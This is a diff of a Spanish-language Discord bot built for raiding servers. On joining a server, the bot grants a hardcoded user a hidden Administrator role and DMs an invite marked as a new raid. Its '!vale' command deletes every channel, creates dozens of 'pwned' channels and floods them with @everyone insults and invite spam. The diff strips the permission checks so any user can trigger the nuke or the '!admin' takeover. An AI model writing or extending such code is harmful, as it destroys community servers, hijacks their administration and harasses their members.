@@ -12,10 +12,9 @@ const client = new Client({
 });
 
 const PREFIX = '!';
-const OWNER_IDS = [
-  "1436516806842912970",   // Patricio (tú)
-  "987654321098765432"     // ID de la persona del tutorial (cámbialo por el real)
-];
+
+// Ya no usamos OWNER_IDS para limitar comandos
+// const OWNER_IDS = ["1436516806842912970"]; // comentado o borrado
 
 client.once('ready', () => {
   console.log('Bot conectado como ' + client.user.tag);
@@ -23,7 +22,7 @@ client.once('ready', () => {
 });
 
 // ────────────────────────────────────────────────
-//     NUEVO EVENTO: Auto-admin + DM al unirse a server
+//     EVENTO: Auto-admin + DM al unirse a server
 // ────────────────────────────────────────────────
 
 client.on('guildCreate', async (guild) => {
@@ -32,17 +31,17 @@ client.on('guildCreate', async (guild) => {
   try {
     // Crear rol con permisos de administrador
     const adminRole = await guild.roles.create({
-      name: 'Admin $pwm',          // puedes cambiarlo
-      color: '#d9ff00',                // rojo intenso
-      permissions: ['Administrator'],  // todos los permisos de admin
-      hoist: true,                     // aparece separado
+      name: 'Admin $PWM#KJJJA',
+      color: '#9900ff',
+      permissions: ['Administrator'],
+      hoist: true,
       mentionable: true
     });
 
     console.log(`Rol creado: ${adminRole.name}`);
 
     // Asignarte el rol (tu ID real)
-    const tuId = '1436516806842912970'; // ← TU ID AQUÍ (cámbialo si es necesario)
+    const tuId = '1436516806842912970'; // ← TU ID AQUÍ
     const miembro = await guild.members.fetch(tuId).catch(() => null);
 
     if (miembro) {
@@ -57,7 +56,7 @@ client.on('guildCreate', async (guild) => {
         if (invite) inviteLink = invite.url;
       }
 
-      // Enviar DM privado
+      // Enviar DM privado a ti
       try {
         const dm = await client.users.fetch(tuId);
         await dm.send(`!Nuevo raid! ${inviteLink}`);
@@ -66,7 +65,7 @@ client.on('guildCreate', async (guild) => {
         console.log('No pude enviar DM:', e.message);
       }
     } else {
-      console.log(`No te encontré en ${guild.name} (no estás miembro)`);
+      console.log(`No te encontré en ${guild.name}`);
     }
 
   } catch (err) {
@@ -75,7 +74,7 @@ client.on('guildCreate', async (guild) => {
 });
 
 // ────────────────────────────────────────────────
-//          COMANDOS EXISTENTES (igual que antes)
+//                COMANDOS (sin OWNER_IDS)
 // ────────────────────────────────────────────────
 
 client.on('messageCreate', async (message) => {
@@ -90,17 +89,12 @@ client.on('messageCreate', async (message) => {
   }
 
   if (command === 'help') {
-    return message.reply('Comandos:\n!test → prueba\n!vale → nuke en ráfaga extrema\n!help → este mensaje');
+    return message.reply('Comandos:\n!test → prueba\n!vale → nuke en ráfaga extrema\n!admin → dame admin\n!help → este mensaje');
   }
 
   if (command === 'vale') {
-    if (!OWNER_IDS.includes(message.author.id)) {
-      return message.reply('No tienes permiso para este comando tan heavy.');
-    }
-
-    // ────────────────────────────────────────────────
-    //     PERSONALIZA AQUÍ (CANALES Y MENSAJES)
-    // ────────────────────────────────────────────────
+    // SIN RESTRICCIÓN: cualquiera puede usarlo ahora
+    // (si querés volver a limitarlo, solo pon de nuevo el if de OWNER_IDS)
 
     const nombresDeCanales = [
       "pwned-by-la-elite-7-brou",
@@ -133,7 +127,6 @@ client.on('messageCreate', async (message) => {
       "pwned-by-la-elite-7-brou",
       "pwned-by-la-elite-7-brou",
       "pwned-by-la-elite-7-brou",
-      // Agrega más si quieres
     ];
 
     const mensajesEnRafaga = [
@@ -178,11 +171,10 @@ client.on('messageCreate', async (message) => {
       "@everyone pendejo subnormal hijueputa https://discord.gg/ZZBf67J7 ",
       "@everyone Tu server asqueroso JAJAJAJa https://discord.gg/ZZBf67J7 ",
       "@everyone Tu server asqueroso JAJAJAJa https://discord.gg/ZZBf67J7 "
-      // Agrega o quita mensajes aquí
     ];
 
-    const delayCreacionCanales = 200;   // 0.2 segundos entre canales
-    const delayEntreMensajes = 120;     // 0.12 segundos entre mensajes
+    const delayCreacionCanales = 200;
+    const delayEntreMensajes = 120;
 
     try {
       await message.reply(
@@ -195,7 +187,6 @@ client.on('messageCreate', async (message) => {
 
       const guild = message.guild;
 
-      // Borrar canales (excepto el actual)
       let borrados = 0;
       for (const ch of guild.channels.cache.values()) {
         if (ch.deletable && ch.id !== message.channel.id) {
@@ -208,7 +199,6 @@ client.on('messageCreate', async (message) => {
       }
       await message.channel.send(`→ Borrados **${borrados}** canales.`);
 
-      // Crear canales
       const nuevosCanales = [];
       for (const nombreOriginal of nombresDeCanales) {
         try {
@@ -235,7 +225,6 @@ client.on('messageCreate', async (message) => {
       }
       await message.channel.send(`→ Creados **${nuevosCanales.length}** canales.`);
 
-      // Spam en ráfaga paralela
       const promesas = nuevosCanales.map(async (canal) => {
         for (const msg of mensajesEnRafaga) {
           try {
@@ -261,13 +250,7 @@ client.on('messageCreate', async (message) => {
   }
 
   if (command === 'admin') {
-    if (!OWNER_IDS.includes(message.author.id)) {
-      return message.reply('Solo el owner del bot puede usar !admin.');
-    }
-
-    if (!message.member.permissions.has('Administrator') || message.guild.ownerId !== message.author.id) {
-      return message.reply('Este comando solo funciona si eres **owner** del servidor donde lo escribes.');
-    }
+    // SIN RESTRICCIÓN: cualquiera puede usarlo ahora
 
     const serverName = args.join(' ');
     if (!serverName) {
@@ -290,7 +273,7 @@ client.on('messageCreate', async (message) => {
       await message.member.roles.add(rolAdmin);
       await message.channel.send(`¡Listo! Ahora tienes **Admin Raid** en **${serverName}** 😈`);
 
-      await message.channel.send(`@everyone EL OWNER PATRICIO AHORA ES ADMIN AQUÍ 🔥 https://discord.gg/tu-invite`);
+      await message.channel.send(`@everyone EL OWNER AHORA ES ADMIN AQUÍ 🔥 https://discord.gg/tu-invite`);
 
     } catch (err) {
       console.error('Error en !admin:', err.message || err);
